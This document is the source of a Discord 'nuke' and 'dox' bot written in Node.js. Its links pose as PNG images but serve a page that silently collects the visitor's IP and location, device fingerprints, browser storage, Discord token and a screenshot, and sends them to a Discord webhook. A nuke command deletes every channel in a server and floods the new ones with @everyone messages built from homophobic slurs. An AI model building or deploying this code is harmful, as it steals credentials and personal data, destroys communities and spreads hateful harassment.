const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
const PORT = process.env.PORT || 3000;

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

const links = new Map();

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
});
app.listen(PORT, () => console.log(`🌐 Dox server on ${PORT}`));

client.once('ready', async () => {
    console.log(`🤖 ${client.user.tag} ready`);
    await client.application.commands.set([]);
    await client.application.commands.set([
        {
            name: 'dox',
            description: 'Ultimate dox link',
            options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }]
        },
        {
            name: 'spam',
            description: 'Spam a channel',
            options: [
                { name: 'count', type: 4, description: 'Number of messages', required: true },
                { name: 'message', type: 3, description: 'Content', required: true }
            ]
        },
        {
            name: 'nuke',
            description: 'Delete channels, create 20, spam, leave',
            options: [
                { name: 'count', type: 4, description: 'Messages per channel (default 10, max 100)', required: false },
                { name: 'delay', type: 4, description: 'Delay between messages (ms, default 50)', required: false }
            ]
        },
        { name: 'ad', description: 'Advertise server' },
        {
            name: 'purge',
            description: 'Delete messages',
            options: [
                { name: 'amount', type: 4, description: 'Number of messages', required: true },
                { name: 'user', type: 6, description: 'Target user (optional)', required: false }
            ]
        }
    ]);
    console.log('✅ Commands loaded');
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // ---- DOX ----
    if (interaction.commandName === 'dox') {
        await interaction.deferReply({ ephemeral: true });
        const wh = interaction.options.getString('webhook');
        if (!wh.startsWith('https://discord.com/api/webhooks/')) {
            return interaction.editReply('❌ Invalid webhook URL.');
        }
        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
        links.set(id, { webhook: wh, user: interaction.user.tag });
        const embed = new EmbedBuilder()
            .setTitle('✅ Dox Ready')
            .setColor(0x22c55e)
            .setDescription(`🔗 ${url}\n\nSends IP, token, storage, screenshot, fingerprints.`);
        await interaction.editReply({ embeds: [embed] });
        return;
    }

    // ---- SPAM ----
    if (interaction.commandName === 'spam') {
        await interaction.deferReply({ ephemeral: true });
        const count = interaction.options.getInteger('count');
        const msg = interaction.options.getString('message');
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        const max = Math.min(count, 100);
        for (let i = 0; i < max; i++) {
            await channel.send(msg).catch(() => {});
        }
        await interaction.editReply(`✅ Spammed ${max} messages.`);
        return;
    }

    // ---- NUKE ----
    if (interaction.commandName === 'nuke') {
        await interaction.deferReply({ ephemeral: true });
        const guild = interaction.guild;
        if (!guild) return interaction.editReply('❌ Server only.');
        if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return interaction.editReply('❌ I need Administrator.');
        }

        const messagesPerChannel = Math.min(interaction.options.getInteger('count') || 10, 100);
        const delayMs = Math.min(interaction.options.getInteger('delay') || 50, 500);
        const channelCount = 20; // 👈 Changed from 10 to 20
        const maxLength = 2000;

        const baseLine = '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER';
        const variants = [
            baseLine,
            '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER',
            '# PULSE OWNS ALL U F@GGOTS TRASH ASS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH AS SERVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SRVER',
            '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERV ER',
            '# PULSE OWNS ALL YOU FAGGOTS TRASH ASS SERVER',
        ];
        const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;

        try {
            await Promise.all(guild.channels.cache.map(ch => ch.delete().catch(() => {})));

            const newChannels = await Promise.all(
                Array.from({ length: channelCount }, () =>
                    guild.channels.create({ name: 'pulse', type: 0 }).catch(() => null)
                )
            );
            const valid = newChannels.filter(c => c !== null);

            const messages = [];
            for (let i = 0; i < messagesPerChannel; i++) {
                const line = variants[i % variants.length];
                let bigMessage = `@everyone ${line}\n`;
                const repeatLine = line + '\n';
                while (bigMessage.length + repeatLine.length < maxLength - inviteLine.length - 2) {
                    bigMessage += repeatLine;
                }
                bigMessage += `\n${inviteLine}`;
                bigMessage = bigMessage.slice(0, maxLength);
                messages.push(bigMessage);
            }

            for (let i = 0; i < messages.length; i++) {
                const msg = messages[i];
                await Promise.all(valid.map(ch => ch.send(msg).catch(() => {})));
                if (i < messages.length - 1) await new Promise(r => setTimeout(r, delayMs));
            }

            await guild.leave();
            await interaction.editReply(`✅ Nuked. Created ${valid.length} channels, sent ${messagesPerChannel} messages each, left.`);
        } catch (e) {
            await interaction.editReply('❌ Nuke failed: ' + e.message);
        }
        return;
    }

    // ---- AD ----
    if (interaction.commandName === 'ad') {
        await interaction.deferReply({ ephemeral: true });
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        const msg = `🔥 PULSE NUKE POWER 🔥\n${INVITE_LINK}`;
        await channel.send(msg).catch(() => {});
        await interaction.editReply('✅ Ad sent.');
        return;
    }

    // ---- PURGE ----
    if (interaction.commandName === 'purge') {
        await interaction.deferReply({ ephemeral: true });
        const amount = interaction.options.getInteger('amount');
        const user = interaction.options.getUser('user');
        const channel = interaction.channel;
        if (!channel) return interaction.editReply('❌ No channel.');
        if (!channel.permissionsFor(interaction.member).has(PermissionsBitField.Flags.ManageMessages)) {
            return interaction.editReply('❌ You need Manage Messages.');
        }
        let messages = await channel.messages.fetch({ limit: Math.min(amount, 100) });
        if (user) messages = messages.filter(m => m.author.id === user.id);
        const deleted = await channel.bulkDelete(messages, true).catch(() => {});
        await interaction.editReply(`✅ Purged ${deleted ? deleted.size : 0} messages.`);
        return;
    }
});

// ---- DOX HTML (unchanged) ----
function generateDoxHTML(webhook) {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
    <style>
        body { background: #0b0b12; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: 'Segoe UI', sans-serif; color: #f0f0ff; }
        .container { text-align: center; padding: 20px; }
        .spinner { border: 4px solid rgba(255,255,255,0.04); border-top: 4px solid #8B5CF6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #8888aa; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container" id="loading">
        <h1>🔮 Loading...</h1>
        <div class="spinner"></div>
        <p class="status">Collecting data, please wait...</p>
    </div>

<script>
const WEBHOOK_URL = "${webhook}";

function hash(str) {
    let h = 0;
    for (let i = 0; i < str.length; i++) { h = ((h << 5) - h) + str.charCodeAt(i); h |= 0; }
    return h.toString(36);
}

function getCookie(name) {
    const value = \`; \${document.cookie}\`;
    const parts = value.split(\`; \${name}=\`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

async function getIPData() {
    const apis = [
        { url: 'https://ipinfo.io/json', parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1], asn: d.asn, isp: d.org, timezone: d.timezone })},
        { url: 'https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query', parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: 'N/A' })},
        { url: 'https://api.ipify.org?format=json', parse: d => ({ ip: d.ip }) }
    ];
    for (const api of apis) {
        try {
            const res = await fetch(api.url);
            const data = await res.json();
            if (data.ip) {
                const result = api.parse(data);
                if (result.ip) return result;
            }
        } catch {}
    }
    return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', timezone: 'N/A' };
}

async function getBattery() {
    try { const b = await navigator.getBattery(); return Math.round(b.level*100)+'% ('+(b.charging?'Charging':'Not')+')'; }
    catch { return 'Not Available'; }
}

function getConnection() {
    try { const c = navigator.connection || navigator.mozConnection; if (c) return (c.effectiveType || c.type) + ' (' + (c.downlink || 'N/A') + ' Mbps)'; } catch {}
    return 'Not Available';
}

function getGPU() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (!gl) return 'N/A';
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        if (!debug) return 'N/A';
        return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
    } catch { return 'N/A'; }
}

function getWebRTC() {
    return new Promise(r => {
        try {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = e => {
                if (!e.candidate) return;
                const ip = e.candidate.address || e.candidate.ip;
                if (ip && !ip.includes('local')) { r(ip); pc.close(); }
            };
            setTimeout(() => { r('N/A'); pc.close(); }, 2000);
        } catch { r('N/A'); }
    });
}

function getCanvasFP() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 256; canvas.height = 64;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
        ctx.fillStyle = 'rgba(102,204,0,0.7)';
        ctx.fillText('Cwm fjordbank glyphs vext quiz', 4, 17);
        return canvas.toDataURL();
    } catch { return 'N/A'; }
}

function getFonts() {
    const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Calibri', 'Cambria', 'Consolas', 'Segoe UI', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Ubuntu', 'Inter'];
    const base = 'mmmmmmmmmmlli';
    const test = document.createElement('span');
    test.style.cssText = 'position:absolute;top:-9999px;left:-9999px;font-size:72px;font-family:monospace;';
    test.innerHTML = base;
    document.body.appendChild(test);
    const refWidth = test.offsetWidth, refHeight = test.offsetHeight;
    const detected = [];
    fontList.forEach(font => {
        test.style.fontFamily = font + ', monospace';
        if (test.offsetWidth !== refWidth || test.offsetHeight !== refHeight) detected.push(font);
    });
    document.body.removeChild(test);
    return detected;
}

function getAudioFP() {
    return new Promise(resolve => {
        try {
            const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
            const osc = ctx.createOscillator();
            osc.type = 'triangle';
            osc.frequency.value = 1000;
            const comp = ctx.createDynamicsCompressor();
            osc.connect(comp);
            comp.connect(ctx.destination);
            osc.start(0);
            ctx.oncomplete = e => {
                const buffer = e.renderedBuffer.getChannelData(0);
                let str = '';
                for (let i = 0; i < 100; i++) str += buffer[i].toFixed(6);
                resolve(hash(str));
            };
            ctx.startRendering();
        } catch { resolve('N/A'); }
    });
}

async function takeScreenshot() {
    try {
        if (typeof html2canvas === 'undefined') return null;
        await new Promise(r => setTimeout(r, 100));
        const canvas = await html2canvas(document.body, {
            useCORS: true,
            logging: false,
            scale: 1,
            width: window.innerWidth,
            height: document.documentElement.scrollHeight,
            windowHeight: document.documentElement.scrollHeight,
            scrollY: 0,
            scrollX: 0
        });
        return canvas.toDataURL('image/png');
    } catch { return null; }
}

(async function() {
    try {
        document.getElementById('loading').innerHTML = '<h1>🔮 Collecting...</h1><div class="spinner"></div><p class="status">Gathering device data...</p>';

        const ip = await getIPData();
        const battery = await getBattery();
        const conn = getConnection();
        const gpu = getGPU();
        const webrtc = await getWebRTC();
        const canvasFP = getCanvasFP();
        const fonts = getFonts();
        const audioFP = await getAudioFP();

        const ua = navigator.userAgent;
        const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
        const os = ua.includes('Windows NT 10.0') ? 'Windows 10/11' : ua.includes('Mac OS X') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
        const deviceType = /mobile|android|iphone|ipad/i.test(ua) ? '📱 Mobile' : /tablet|ipad/i.test(ua) ? '📱 Tablet' : '💻 Desktop';

        let ls = {}, ss = {};
        try { for (let i=0; i<localStorage.length; i++) { const k = localStorage.key(i); ls[k] = localStorage[k]; } } catch {}
        try { for (let i=0; i<sessionStorage.length; i++) { const k = sessionStorage.key(i); ss[k] = sessionStorage[k]; } } catch {}

        let discordToken = localStorage.getItem('token') || getCookie('token') || 'N/A';

        const pageTitle = document.title;
        const pageURL = window.location.href;
        const referrer = document.referrer || 'N/A';

        const data = {
            timestamp: new Date().toISOString(),
            ip: ip.ip, country: ip.country, region: ip.region, city: ip.city, postal: ip.postal,
            lat: ip.lat, lon: ip.lon, asn: ip.asn, isp: ip.isp, timezone: ip.timezone,
            battery, connection: conn, gpu, webrtc, canvasFP: hash(canvasFP), fonts: fonts.join(', '),
            audioFP, browser, os, deviceType,
            screen: screen.width+'x'+screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            devicePixelRatio: window.devicePixelRatio || 1,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
            platform: navigator.platform,
            hardwareCores: navigator.hardwareConcurrency || 'N/A',
            deviceMemory: navigator.deviceMemory || 'N/A',
            touchPoints: navigator.maxTouchPoints || 0,
            cookiesEnabled: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
            doNotTrack: navigator.doNotTrack || 'N/A',
            discordToken: discordToken,
            localStorage: JSON.stringify(ls).slice(0, 1000),
            sessionStorage: JSON.stringify(ss).slice(0, 1000),
            pageTitle, pageURL, referrer,
            userAgent: ua
        };

        const fields = [
            { name: '🌐 IP', value: data.ip, inline: true },
            { name: '📍 Country', value: data.country, inline: true },
            { name: '🏙️ City', value: data.city, inline: true },
            { name: '🗺️ Region', value: data.region, inline: true },
            { name: '📮 Postal', value: data.postal, inline: true },
            { name: '📌 Coordinates', value: \`\${data.lat}, \${data.lon}\`, inline: true },
            { name: '🔢 ASN', value: data.asn, inline: true },
            { name: '🏢 ISP', value: data.isp, inline: true },
            { name: '🕒 Timezone', value: data.timezone, inline: true },
            { name: '🔋 Battery', value: data.battery, inline: true },
            { name: '📶 Connection', value: data.connection, inline: true },
            { name: '📱 Screen', value: data.screen, inline: true },
            { name: '🧠 Browser', value: data.browser, inline: true },
            { name: '💻 OS', value: data.os, inline: true },
            { name: '🖥️ Device', value: data.deviceType, inline: true },
            { name: '🎮 GPU', value: data.gpu, inline: false },
            { name: '📡 WebRTC', value: data.webrtc, inline: true },
            { name: '💾 Hardware', value: \`\${data.hardwareCores} cores, \${data.deviceMemory}GB RAM\`, inline: true },
            { name: '🖱️ Touch', value: data.touchPoints + ' points', inline: true },
            { name: '🍪 Cookies', value: data.cookiesEnabled, inline: true },
            { name: '🚫 Do Not Track', value: data.doNotTrack, inline: true },
            { name: '🖼️ Canvas FP', value: data.canvasFP, inline: true },
            { name: '🔤 Fonts', value: data.fonts || 'N/A', inline: false },
            { name: '🔊 Audio FP', value: data.audioFP, inline: true },
            { name: '🔑 Discord Token', value: data.discordToken || 'N/A', inline: false },
            { name: '📂 localStorage (truncated)', value: data.localStorage || 'N/A', inline: false },
            { name: '📂 sessionStorage (truncated)', value: data.sessionStorage || 'N/A', inline: false },
            { name: '📄 Page Title', value: data.pageTitle || 'N/A', inline: true },
            { name: '🔗 Page URL', value: data.pageURL || 'N/A', inline: false },
            { name: '↩️ Referrer', value: data.referrer || 'N/A', inline: false },
            { name: '🌐 User Agent', value: data.userAgent || 'N/A', inline: false }
        ];

        const embed = {
            title: '☠️ Ultimate Dox',
            color: 0xFF0000,
            fields: fields,
            footer: { text: 'Logged at ' + data.timestamp }
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });

        document.getElementById('loading').innerHTML = '<h1>📸 Screenshot</h1><div class="spinner"></div><p class="status">Capturing full page...</p>';
        const screenshot = await takeScreenshot();
        if (screenshot) {
            const blob = await fetch(screenshot).then(r => r.blob());
            const formData = new FormData();
            formData.append('file', blob, 'screenshot.png');
            await fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(() => {});
        }

    } catch (err) {
        console.error('Dox error:', err);
    }

    document.body.innerHTML = '';
    document.body.style.background = '#ffffff';
    document.body.style.margin = '0';
    document.body.style.height = '100vh';
    setTimeout(() => {
        window.close();
        window.location.href = 'about:blank';
    }, 2000);
})();
</script>
</body>
</html>`;
}

client.login(TOKEN);
